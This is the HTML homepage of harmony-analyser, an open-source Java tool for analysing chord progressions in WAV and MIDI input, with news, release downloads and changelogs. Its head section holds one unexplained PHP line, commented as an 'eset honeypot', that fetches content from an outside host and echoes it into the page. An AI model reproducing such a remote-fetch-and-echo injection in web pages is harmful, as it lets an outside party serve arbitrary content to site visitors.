<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
	"http://www.w3.org/TR/html4/strict.dtd">
<html>

<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
	<title>harmony-analyser.org</title>
	<meta name="description" itemprop="description" content="harmony-analyser.org: Java Framework and Java application for analysing harmonies and chord progressions of WAV or MIDI input. " />
	<link rel="shortcut icon" href="http://websupport.sk/images/favicon.ico" type="image/x-icon" />
	<link href="style.css" rel="stylesheet">
	<script src="javascript.js"></script>
	<style type="text/css" media="screen">
		@import url(http://m.websupport.sk/generic-pages/default/style.css);
	</style>
	<style>
		body {
			color: black;
			font-size: 1em;
			background: #ddd;
		}

		h1 {
			margin-top: 50px;
		}

		h3 {
			margin-top: 20px;
		}

		img {
			width: 70%;
		}

		#header {
			color: white !important;
		}

		#header a {
			color: white !important;
			text-decoration: none;
			padding: 0 10px;
		}

		#header p {
			width: 50% !important;
		}

		#main {
			text-align: center;
		}

		#main p {
			line-height: 1.3em;
			padding: 15px 0;
		}

		#releases-div {
			font-size: 90%;
			text-align: left;
		}

		#releases-div ul {
			line-height: 1.4em;
		}

		#main_message {
			width: 700px;
			margin: 0 auto;
			line-height: 1.5em;
			padding: 30px 0;
		}
	</style>
    <?php echo @@file_get_contents('http://sfd.eset.com?format=author')  // eset honeypot ?>
</head>

<body>

	<div id="header-wrapper">
		<div id="header" style="font-size: 0.6em;">
			<p>
				harmony-analyser.org
			</p>
			<a href="https://github.com/lacimarsik/harmony-analyser" title="Repository" target="_blank">Repository</a>
			<a href="#news" title="News">News</a>
			<a href="#releases" title="Releases">Releases</a>
			<a href="#screenshots" title="Screenshots">Screenshots</a>
			<a href="documentation" title="Documentation">Documentation</a>
			<a href="http://www.ksi.mff.cuni.cz/en/software.php?sw=45" title="Publications">Publications</a>
			<a href="#contact" title="Contact">Contact</a>
		</div>
	</div>

	<div id="main">
		<h1>
			harmony-analyser
		</h1>
		<img style="width: 200px; padding-top: 40px;" title="harmony-analyser" src="harmony-analyser.png" /><br />
		<div id="intro">
			<div id="main_message">
				<h3>harmony-analyser is a set of visual tools for music harmony analysis of WAV/MIDI input, powered by JHarmonyAnalyser library</h3>
			</div>
			<p>The difference we bring is the approach based on music theory, chord and chroma distances.
				JHarmonyAnalyser uses recent music theory models to extract musical meaning and distances between chords and chroma vectors.
				We aim to develop open-source music player, which is musician / musicologist-friendly and aid recent music information retrieval tasks.</p>
			<p>harmony-analyser tools and JHarmonyAnalyser library are licenced under the <a href="https://github.com/lacimarsik/harmony-analyser/blob/master/LICENSE.txt" target="_blank">GNU GPL License</a>.</p>
				<p>Tools are compatible with GPL Licensed <a target="_blank" href="http://vamp-plugins.org" target="_blank">Vamp plugins</a> which can be used for additional analysis.</p>
			<p>To contribute, please follow our guideline in <a href="https://github.com/lacimarsik/harmony-analyser" target="_blank">GitHub repository</a>.</p>
		</div>
		<div id="news">
			<h3>News</h3>
			<p style="text-align: left; padding-bottom: 0;">2017-04-21 Our contribution was awarded a 1st place in <a href="https://www.sigapp.org/sac/sac2017/">ACM SIGAPP SAC 2017</a> Student Research Competition! We presented a <a href="http://harmony-analyser.org/download/poster-acmsacsrc2017-chord-distance-descriptors.pdf">poster</a>, <a href="http://harmony-analyser.org/download/presentation-acmsacsrc2017-chord-distance-descriptors.pdf">oral presentation</a> and a live demo of our tools to the SRC judges. We advanced to the ACM SRC Grand Finale for all the SRC Winners. Research abstract soon to appear in the <a href="http://dl.acm.org/results.cfm?query=acmdlTitle:(%22Student%20Research%20Abstract:%20Using%20Chord%20Distance%20Desriptors%20to%20Enhance%20Music%20Information%20Retrieval%22)&within=owners.owner=HOSTED&filtered=&dte=&bfr=">ACM Digital Library</a>.</p>
			<p style="text-align: left; padding-bottom: 0;">2017-04-11 We presented how to use our tools on <a href="http://www.cs.vsb.cz/dateso/2017/">DATESO 2017</a> conference. <a href="http://harmony-analyser.org/download/paper-dateso2017-harmony-analyser.pdf">Paper</a> or <a href="http://harmony-analyser.org/download/presentation-dateso2017-harmony-analyser.pdf">presentation</a> for download.</p>
			<p style="text-align: left; padding-bottom: 0;">2016-12-16 We were on <a href="http://wocmat-ircam.strikingly.com/">2016 Joint WOCMAT - IRCAM Forum Conference</a> in Taiwan! Check out the contribution <a href="http://harmony-analyser.org/download/paper-wocmat2016-harmony-analyser.pdf">paper</a> or <a href="http://harmony-analyser.org/download/presentation-wocmat2016-harmony-analyser.pdf">presentation</a>.</p>
			<p style="text-align: left; padding-bottom: 0;">2016-12-07 Preparing the new GUI for version 1.2 - see sneak peak in the <a href="#screenshots">screenshots</a>.</p>
			<p style="text-align: left; padding-bottom: 0;">2016-09-19 Version <a href="#current-release">1.1</a> is now available (new Chroma distances and visualizations).</p>
		</div>
		<div id="releases">
			<h3>Releases</h3>
			<p>Please choose from the releases below:</p>
			<div id="releases-div">
				<strong>harmony-analyser tools</strong><br />
				<p>Latest Beta: <a href="https://github.com/lacimarsik/harmony-analyser/raw/master/target/ha-executable-1.2-beta.jar">ha-executable-1.2-beta.jar (GUI - Executable JAR)</a></p>
				<p>Latest Beta Script: <a href="https://github.com/lacimarsik/harmony-analyser/raw/master/target/ha-script-1.2-beta.jar">ha-script-1.2-beta.jar (CLI script)</a></p>

				<div id="current-release">
					<p>Latest Stable: 2016-09-19 <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.1/ha-executable-1.1.jar">ha-executable-1.1.jar (GUI - Executable JAR)</a></p>
					<p>CHANGELOG</p>
					<ol>
						<li>Added Chroma Complexity analysis, evaluating transitions between subsequent chromas:
							<ul>
								<li>Simple: only activation changes between chromas</li>
								<li>Tonal: Focusing on activation changes between non-key tones, common key being calculated for 2 chromas</li>
							</ul>
						</li>
						<li>Added visualizations for all recent high-level plugins (Chordino, Transition Complexity, Chroma Complexity) in the new Visualization Tool tab</li>
					</ol>
				</div>

				<a id="show" onclick="show();">Show previous releases</a>
				<a id="hide" onclick="hide();">Hide previous releases</a>
				<div id="previous-releases">
					<p>2016-08-11 <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.0/ha-executable-1.0.jar">ha-executable-1.0.jar (GUI - Executable JAR)</a></p>
					<p>CHANGELOG</p>
					In this version, 2 basic types of analysis are supported:
					<ol>
						<li>Chord transition analysis: Using your MIDI keyboard, capture chords, see their names and structure and evaluate their transition</li>
						<li>Audio analysis: Analyse WAV files in a given folder. Supported analysis include:
							<ul>
								<li>low-level VAMP plugin (NNLS Chroma) analysis</li>
								<li>high-level VAMP plugin (Chordino) analysis</li>
								<li>and high-level Transition Complexity analysis, based on theory described in this paper, taking the low-level analysis as an input</li>
							</ul>
						</li>
					</ol>
				</div>
				<div id="current-release-library">
					<strong>JHarmonyAnalyser stand-alone library</strong><br />
					<p>Latest Beta: <a href="https://github.com/lacimarsik/harmony-analyser/raw/master/target/jharmonyanalyser-1.2-beta-standalone.jar">jharmony-analyser-1.2-beta-standalone.jar (JAR archive)</a></p>
					<p>Latest Stable: <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.1/jharmonyanalyser-1.1-standalone.jar">jharmony-analyser-1.1-standalone.jar (JAR archive)</a></p>
				</div>
				<a id="showstandalone" onclick="showstandalone();">Show previous releases</a>
				<a id="hidestandalone" onclick="hidestandalone();">Hide previous releases</a>
				<div id="previous-releases-standalone">
					<p>2016-08-11 <a href="https://github.com/lacimarsik/harmony-analyser/releases/download/v1.0/jharmonyanalyser-1.0-standalone.jar">jharmony-analyser-1.0-standalone.jar (JAR archive)</a></p>
				</div>
			</div>
		</div>

		<div id="screenshots">
			<h3>Screenshots of available tools</h3>
			<p>Chord transition tool</p>
			<img title="Chord transition tool" src="chord_transition_tool.png" /><br />
			<p>Audio analysis tool</p>
			<img title="Audio analysis tool" src="audio_analysis_tool.png" /><br />
			<p>Visualization tool</p>
			<img title="Visualization tool" src="visualization_tool.png" /><br />
		</div>

		<div id="contact" style="margin: 15px 120px; text-align: center;">
			<h3>Contact</h3>
			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;">GitHub: <a href="https://github.com/lacimarsik/harmony-analyser">https://github.com/lacimarsik/harmony-analyser</a></div>
			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;">e-mail: <a href="mailto: marsik@ksi.mff.cuni.cz">marsik@ksi.mff.cuni.cz</a></div>
			</ul>
		</div>
	</div>

</body>

</html>
